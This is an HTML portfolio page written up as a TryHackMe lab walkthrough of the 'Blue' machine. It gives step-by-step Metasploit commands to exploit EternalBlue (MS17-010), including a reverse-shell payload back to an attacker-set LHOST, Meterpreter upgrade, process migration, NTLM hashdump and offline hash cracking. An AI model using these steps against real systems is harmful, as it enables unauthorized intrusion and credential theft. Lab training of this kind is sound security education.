@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Blue — TryHackMe — MOSTAFA ELWASEEF's Portfolio</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0d1117; --bg2: #161b22; --bg3: #21262d;
+      --border: #30363d; --text: #e6edf3; --muted: #8b949e;
+      --accent: #58a6ff; --accent2: #3fb950; --red: #f85149;
+      --orange: #d29922; --radius: 8px;
+      --c-red: #f85149; --c-blue: #58a6ff; --c-green: #3fb950;
+      --c-yellow: #d29922; --c-purple: #bc8cff; --c-pink: #ff7b72;
+      --c-gray: #8b949e;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; font-size: 15px; line-height: 1.7; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    nav { position: sticky; top: 0; z-index: 100; background: rgba(13,17,23,.9); backdrop-filter: blur(12px);
+          border-bottom: 1px solid var(--border); padding: .75rem 2rem; display: flex; align-items: center; justify-content: space-between; }
+    .nav-logo { font-weight: 600; font-size: 1rem; color: var(--text); }
+    .nav-back { font-size: .85rem; color: var(--muted); display: flex; align-items: center; gap: .4rem; }
+    .nav-back:hover { color: var(--accent); text-decoration: none; }
+    .hero { background: var(--bg2); border-bottom: 1px solid var(--border); padding: 3rem 2rem 2.5rem; }
+    .hero-inner { max-width: 860px; margin: 0 auto; }
+    .breadcrumb { font-size: .8rem; color: var(--muted); margin-bottom: 1rem; }
+    .breadcrumb a { color: var(--muted); }
+    .breadcrumb a:hover { color: var(--accent); }
+    .hero h1 { font-size: 2rem; font-weight: 700; margin-bottom: 1rem; }
+    .hero p.desc { color: var(--muted); max-width: 640px; margin-top: .5rem; }
+    .meta-row { display: flex; flex-wrap: wrap; gap: .6rem; align-items: center; }
+    .badge { display: inline-flex; align-items: center; gap: .3rem; padding: .25rem .7rem;
+             border-radius: 20px; font-size: .75rem; font-weight: 500; white-space: nowrap; flex-shrink: 0; }
+    .badge-platform { background: #1f3a5f; color: #58a6ff; border: 1px solid #1f4080; }
+    .badge-easy { background: #1a3a2a; color: #3fb950; border: 1px solid #2ea043; }
+    .badge-medium { background: #3a2a1a; color: #d29922; border: 1px solid #9e6a03; }
+    .badge-hard { background: #3a1a1a; color: #f85149; border: 1px solid #da3633; }
+    .badge-beginner { background: #1a3a2a; color: #56d364; border: 1px solid #2ea043; }
+    .badge-critical { background: #2f1f47; color: #bc8cff; border: 1px solid #6e40c9; }
+    .badge-impossible { background: #2f1f47; color: #bc8cff; border: 1px solid #6e40c9; }
+    .badge-os { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .badge-date { background: var(--bg3); color: var(--muted); border: 1px solid var(--border); }
+    .content { max-width: 860px; margin: 0 auto; padding: 3rem 2rem 5rem; }
+    h1, h2, h3, h4 { color: var(--text); font-weight: 600; margin: 2rem 0 .75rem; }
+    h2 { font-size: 1.35rem; padding-bottom: .5rem; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 1.1rem; color: var(--accent); }
+    h4 { font-size: .95rem; color: var(--muted); margin-top: 1.5rem; }
+    p { margin: .6rem 0; color: #c9d1d9; }
+    ul, ol { margin: .5rem 0 .5rem 1.5rem; }
+    li { margin: .3rem 0; color: #c9d1d9; }
+    hr { border: none; border-top: 1px solid var(--border); margin: 1.5rem 0; }
+    blockquote { border-left: 3px solid var(--accent); padding: .5rem 1rem; margin: .75rem 0;
+                 background: var(--bg2); border-radius: 0 var(--radius) var(--radius) 0; color: var(--muted); }
+    pre { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius);
+          padding: 1rem 1.25rem; overflow-x: auto; margin: .75rem 0; }
+    code { font-family: 'Fira Code', monospace; font-size: .85rem; color: #e6edf3; }
+    p code, li code, td code, h1 code, h2 code, h3 code, h4 code, blockquote code {
+      background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; color: var(--accent); font-size: .82rem;
+    }
+    strong code { background: var(--bg3); padding: .1rem .35rem; border-radius: 4px; }
+    figure { margin: 1.25rem 0; }
+    img { max-width: 100%; border-radius: var(--radius); border: 1px solid var(--border);
+          display: block; margin: 0 auto; }
+    figcaption { text-align: center; font-size: .8rem; color: var(--muted); margin-top: .4rem; }
+    .callout { display: flex; gap: .75rem; align-items: flex-start; background: var(--bg2);
+               border: 1px solid var(--border); border-radius: var(--radius); padding: .9rem 1rem; margin: .75rem 0; }
+    .callout-icon { font-size: 1.1rem; flex-shrink: 0; margin-top: .1rem; }
+    details { border: 1px solid var(--border); border-radius: var(--radius); margin: .5rem 0; }
+    summary { padding: .6rem 1rem; cursor: pointer; font-weight: 500; background: var(--bg2); border-radius: var(--radius); }
+    details[open] summary { border-radius: var(--radius) var(--radius) 0 0; border-bottom: 1px solid var(--border); }
+    details > *:not(summary) { padding: .75rem 1rem; }
+    .table-wrap { overflow-x: auto; margin: .75rem 0; }
+    table { border-collapse: collapse; width: 100%; font-size: .9rem; }
+    th, td { padding: .6rem .9rem; border: 1px solid var(--border); text-align: left; }
+    th { background: var(--bg3); font-weight: 600; }
+    tr:nth-child(even) { background: rgba(33,38,45,.5); }
+    .columns { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 1rem; margin: .75rem 0; }
+    .cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 1rem; margin-top: 1.5rem; }
+    .card { background: var(--bg2); border: 1px solid var(--border); border-radius: var(--radius); padding: 1.25rem;
+            transition: border-color .15s, transform .15s; display: block; }
+    .card:hover { border-color: var(--accent); transform: translateY(-2px); text-decoration: none; }
+    .card-header { display: flex; align-items: flex-start; justify-content: space-between; margin-bottom: .6rem; gap: .5rem; }
+    .card-title { font-size: 14px; font-weight: 600; color: var(--text); flex: 1 1 auto; min-width: 0; }
+    .card-meta { font-size: 12px; color: var(--muted); margin-bottom: .4rem; }
+    .card-desc { font-size: 13px; color: var(--muted); }
+    footer { border-top: 1px solid var(--border); padding: 2rem; text-align: center; color: var(--muted); font-size: .85rem; }
+    @media (max-width: 620px) {
+      nav { padding: .65rem 1.25rem; }
+      .hero { padding: 2rem 1.25rem 1.75rem; }
+      .hero h1 { font-size: 1.5rem; }
+      .content { padding: 2rem 1.25rem 3rem; }
+      .cards { grid-template-columns: 1fr; }
+    }
+</style>
+</head>
+<body>
+<nav>
+  <span class="nav-logo">Waseef</span>
+  <a href="../../index.html" class="nav-back">← Back to Portfolio</a>
+</nav>
+
+<div class="hero">
+  <div class="hero-inner">
+    <div class="breadcrumb"><a href="../../index.html">Portfolio</a> / <a href="../../index.html#machines">Machines</a> / Blue — TryHackMe</div>
+    <h1>Blue — TryHackMe</h1>
+    <div class="meta-row">
+      <span class="badge badge-platform">🖥 TryHackMe</span>
+      <span class="badge badge-easy">🟢 Easy</span>
+      <span class="badge badge-os">🐧 Windows Server 2012 R2 Datacenter x64</span>
+      <span class="badge badge-date">📅 2026-08-13</span>
+    </div>
+  </div>
+</div>
+
+<div class="content">
+<h2 id="machine-info">Machine Info</h2>
+<div class='table-wrap'><table>
+  <tr><th>Field</th><th>Value</th></tr>
+  <tr><td><strong>Machine</strong></td><td>Blue</td></tr>
+  <tr><td><strong>Platform</strong></td><td>TryHackMe</td></tr>
+  <tr><td><strong>IP Address</strong></td><td>10.114.157.205</td></tr>
+  <tr><td><strong>OS</strong></td><td>Windows Server 2012 R2 Datacenter x64</td></tr>
+  <tr><td><strong>Difficulty</strong></td><td>Easy</td></tr>
+  <tr><td><strong>Date</strong></td><td>2026-08-13</td></tr>
+</table></div>
+<hr>
+<h2 id="executive-summary">Executive Summary</h2>
+<p>The Blue machine runs Windows Server 2012 R2 and exposes an unpatched SMBv1 service vulnerable to EternalBlue (MS17-010). A vulnerability scan confirmed the exposure and Metasploit’s <code>ms17_010_eternalblue</code> module delivered a reverse shell as NT AUTHORITY. The shell was upgraded to a Meterpreter session using the <code>shell_to_meterpreter</code> post module, and the process was migrated to a stable SYSTEM-owned process. A <code>hashdump</code> extracted NTLM credentials for all local accounts, and Jon’s hash was cracked offline using CrackStation. All three flags were located and retrieved from the file system.</p>
+<hr>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="objective">Objective</h3>
+<p>Identify open ports, running services, and any known vulnerabilities on the target.</p>
+<h3 id="findings">Findings</h3>
+<p>An Nmap service and vulnerability scan was run against the target: <code>nmap -sV -O --script vuln 10.114.157.205</code>. The scan identified the following open ports:</p>
+<ul>
+  <li><strong>135/tcp</strong> — Microsoft Windows RPC</li>
+  <li><strong>139/tcp</strong> — NetBIOS-SSN</li>
+  <li><strong>445/tcp</strong> — Microsoft Windows Server 2008 R2 – 2012 microsoft-ds</li>
+  <li><strong>3389/tcp</strong> — Microsoft Terminal Service</li>
+  <li><strong>5985/tcp</strong> — Microsoft HTTPAPI httpd 2.0</li>
+</ul>
+<p>OS detection identified the host as <strong>Microsoft Windows Server 2012 R2 Datacenter 9600 x64</strong>. The <code>--script vuln</code> flag runs Nmap’s vulnerability detection scripts alongside the service scan. The <code>smb-vuln-ms17-010</code> script returned a critical finding on port 445: a Remote Code Execution vulnerability in Microsoft SMBv1 (CVE-2017-0143, Risk factor: HIGH), confirming the target was vulnerable to EternalBlue.</p>
+<p><strong>PoC:</strong><br>- <strong>Tools used</strong>: Nmap<br>- <strong>Command</strong>: <code>nmap -sV -O --script vuln 10.114.157.205</code><br>- <strong>Result</strong>: Port 445 confirmed vulnerable to MS17-010 (EternalBlue); OS identified as Windows Server 2012 R2 Datacenter x64</p>
+<blockquote>  <figure><img src="images/blue/3bbb7523717280a59d1af938df91711c.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb75237172801c8641cd0658bb900e.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="objective">Objective</h3>
+<p>Identify specific vulnerabilities and attack vectors on the discovered services.</p>
+<h3 id="findings">Findings</h3>
+<p>No dedicated enumeration phase was required for this machine. The Nmap <code>--script vuln</code> flag identified MS17-010 on port 445 directly, making further service-specific enumeration unnecessary. Port 445 (SMBv1) was the sole attack surface.</p>
+<hr>
+<h2 id="exploitation-initial-foothold">Exploitation — Initial Foothold</h2>
+<h3 id="description">Description</h3>
+<p>EternalBlue (MS17-010) is a critical remote code execution vulnerability in Microsoft’s SMBv1 implementation. It allows an unauthenticated attacker to send specially crafted packets to port 445 and execute arbitrary code in the context of NT AUTHORITY. The vulnerability was confirmed during reconnaissance and exploited using Metasploit’s <code>exploit/windows/smb/ms17_010_eternalblue</code> module.</p>
+<h3 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h3>
+<ol>
+  <li>Launch Metasploit and search for the EternalBlue exploit: <code>search type:exploit MS17-010</code></li>
+  <li>Load the exploit module: <code>use exploit/windows/smb/ms17_010_eternalblue</code></li>
+  <li>Set the payload: <code>set payload windows/x64/shell/reverse_tcp</code></li>
+  <li>Configure the target and listener: <code>setg rhosts 10.114.157.205</code> and <code>setg lhost 192.168.143.212</code></li>
+  <li>Verify options with <code>options</code> — RHOSTS, LHOST, and LPORT 4444 confirmed</li>
+  <li>Run the exploit: <code>run</code> — the first attempt failed with a socket reset error; a second <code>run</code> succeeded, opening Command shell session 1 as NT AUTHORITY</li>
+  <li>The shell banner confirmed execution on the target: <code>Microsoft Windows [Version 6.3.9600]</code> at prompt <code>C:\Windows\system32&gt;</code></li>
+</ol>
+<blockquote>  <figure><img src="images/blue/3bbb75237172807aab68cd2d6093da6e.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb752371728096b1e4d382adc180d6.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb75237172803a84e4f1abe09213b3.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb75237172808eb9e7cec8666ae157.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb752371728069bcc4ec4673e60ee8.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb752371728050a55cf53d9e275ed9.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="post-exploitation">Post-Exploitation</h2>
+<h3 id="shell-upgrade-to-meterpreter">Shell Upgrade to Meterpreter</h3>
+<p>The initial shell was a basic Windows command shell with limited capabilities. The <code>post/multi/manage/shell_to_meterpreter</code> module was used to upgrade it to a full Meterpreter session, enabling access to commands such as <code>hashdump</code>, <code>search</code>, and <code>migrate</code>.</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
+<ol>
+  <li>Search for the upgrade module: <code>search type:post shell meterpreter</code></li>
+  <li>Load the module: <code>use post/multi/manage/shell_to_meterpreter</code></li>
+  <li>Set the target session: <code>set session 1</code></li>
+  <li>Run the module: <code>run</code> — Meterpreter session 5 opened as NT AUTHORITY@ WIN-JO6REVNMMMMP but timed out shortly after</li>
+  <li>Re-ran the module against the same session: Meterpreter session 8 opened successfully as NT AUTHORITY@ WIN-JO6REVNMMMMP and remained stable</li>
+  <li>Interacted with the new session: <code>sessions -i 8</code></li>
+</ol>
+<blockquote>  <figure><img src="images/blue/3bbb7523717280028821e23e3cd5ab7e.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb7523717280ba91e7db359256efd6.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb75237172802ca722e3c4b99f93fd.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb75237172807a9500ce4da33a9fb8.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb752371728004964ee04872fb78a1.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb752371728024950bc3f371f25dbf.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<h3 id="process-migration">Process Migration</h3>
+<p>Meterpreter sessions can become unstable if attached to short-lived or volatile processes. The process list was reviewed to identify a stable SYSTEM-owned process, and the session was migrated to it.</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
+<ol>
+  <li>List running processes: <code>ps</code></li>
+  <li>Identified <code>cmd.exe</code> (PID 2260) running as NT AUTHORITYas a suitable migration target</li>
+  <li>Migrated the session: <code>migrate 2260</code> — migration completed successfully from PID 1440 (powershell.exe)</li>
+</ol>
+<blockquote>  <figure><img src="images/blue/3bbb75237172802baa63d57512b718b5.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<h3 id="credential-extraction">Credential Extraction</h3>
+<p>With a stable SYSTEM-level Meterpreter session, the local account hashes were dumped directly from the SAM database via LSASS memory.</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
+<ol>
+  <li>Run <code>hashdump</code> — extracted NTLM hashes for three local accounts: Administrator, Guest, and Jon</li>
+  <li>Hashes: <code>[REDACTED]</code> for all three accounts</li>
+</ol>
+<blockquote>  <figure><img src="images/blue/3bbb7523717280ca8ea7ca9a5e1b035b.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<h3 id="hash-cracking">Hash Cracking</h3>
+<p>Jon’s NTLM hash was submitted to CrackStation for offline lookup against its pre-computed hash database.</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
+<ol>
+  <li>Copy Jon’s NTLM hash from the <code>hashdump</code> output</li>
+  <li>Submit the hash to CrackStation (crackstation.net) — identified as NTLM type and cracked successfully</li>
+  <li>Jon’s plaintext password: <code>[REDACTED]</code></li>
+</ol>
+<blockquote>  <figure><img src="images/blue/3bbb7523717280178f27e12401bcb038.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<h3 id="flag-collection">Flag Collection</h3>
+<p>All three flags were located by searching the file system directly from the Meterpreter session.</p>
+<h4 id="poc-steps-to-reproduce">PoC — Steps to Reproduce</h4>
+<ol>
+  <li>Search for Flag 1: <code>search -f Flag1.txt -d c:\\</code> — located at <code>c:\flag1.txt</code></li>
+  <li>Read Flag 1: <code>cat c:\flag1.txt</code> → <code>[REDACTED]</code> (found at the system root)</li>
+  <li>Search for Flag 2: <code>search -f flag2.txt -d c:\\</code> — located at <code>c:\Windows\System32\config\flag2.txt</code></li>
+  <li>Read Flag 2: <code>cat "c:\Windows\System32\config\flag2.txt"</code> → <code>[REDACTED]</code> (found in the SAM database directory)</li>
+  <li>Search for Flag 3: <code>search -f flag3.txt -d c:\\</code> — located at <code>c:\Users\Jon\Documents\flag3.txt</code></li>
+  <li>Read Flag 3: <code>cat "c:\Users\Jon\Documents\flag3.txt"</code> → <code>[REDACTED]</code> (found in the local user’s Documents folder)</li>
+</ol>
+<blockquote>  <figure><img src="images/blue/3bbb7523717280019490c4a177ad6de1.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb752371728068aabff3edeaf0ccf0.png" alt="screenshot" loading="lazy"></figure>
+  <figure><img src="images/blue/3bbb7523717280fea0dee4866d95093f.png" alt="screenshot" loading="lazy"></figure>
+</blockquote>
+<hr>
+<h2 id="lessons-learned">Lessons Learned</h2>
+<p>EternalBlue remains one of the most impactful vulnerabilities ever disclosed. A single unpatched SMBv1 service on Windows Server 2012 R2 led to full SYSTEM-level compromise with no credentials required. Key takeaways:</p>
+<p>The <code>--script vuln</code> flag in Nmap runs vulnerability detection scripts alongside a standard service scan, identifying MS17-010 in a single command without a dedicated scanner. EternalBlue is notable because it delivers code execution directly as SYSTEM, bypassing any privilege escalation step entirely — not all Windows compromises require a separate privesc phase.</p>
+<p>The <code>post/multi/manage/shell_to_meterpreter</code> module is the standard way to upgrade a basic command shell to Meterpreter. It can fail on the first attempt; re-running it against the same session typically resolves the issue. After upgrading, process migration is important for session stability — migrating to a long-running SYSTEM process prevents the session from dying when the original host process exits.</p>
+<p>NTLM hashes from <code>hashdump</code> can be cracked entirely offline using tools like CrackStation or Hashcat, without sending any additional traffic to the target. The three flags on this machine highlight three locations every Windows pentester should know: the system root (<code>C:\</code>), the SAM database directory (<code>C:\Windows\System32\config</code>), and a local user’s Documents folder (<code>C:\Users\&lt;username&gt;\Documents</code>).</p>
+
+</div>
+
+<footer>Built by Waseef · <a href="../../index.html">Back to Portfolio</a></footer>
+</body>
+</html>
